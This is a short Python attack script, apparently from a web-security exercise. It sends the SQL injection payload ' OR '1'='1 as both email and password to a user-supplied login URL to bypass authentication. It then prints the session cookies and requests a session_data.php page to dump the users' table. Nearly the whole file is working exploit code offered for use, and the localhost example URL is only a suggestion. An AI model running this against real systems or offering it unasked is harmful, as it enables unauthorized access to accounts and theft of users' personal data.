import requests

def get_users_from_session(url, payload):
    session = requests.Session()
    data = {
        'email': payload,
        'password': payload,
        'login': 'Login'
    }

    login_response = session.post(url, data=data)
    if "Invalid email or password." not in login_response.text and login_response.status_code == 200:
        print(login_response)
        print("Successfully logged in. Now accessing user data...")

        cookies = session.cookies.get_dict()
        print("Session cookies:")
        for cookie_name, cookie_value in cookies.items():
            print(f"{cookie_name}: {cookie_value}")

        if url.find("login.php") != -1:
            session_data_url = url.replace("login.php", "session_data.php")  # Create a script to access session data
            user_data_response = session.get(session_data_url)
            print(user_data_response)

            if user_data_response.status_code == 200:
                print("User data retrieved from session:")
                print(user_data_response.text)  # This should contain the JSON or HTML of the users' table
            else:
                print("Failed to retrieve user data.")
    else:
        print("Login failed. Check your credentials or SQL injection payload.")

if __name__ == "__main__":
    url = input("Enter the URL of the login page (e.g., http://localhost/webApp/project/login.php): ")
    payload = "' OR '1'='1"  # SQL injection payload

    get_users_from_session(url, payload)
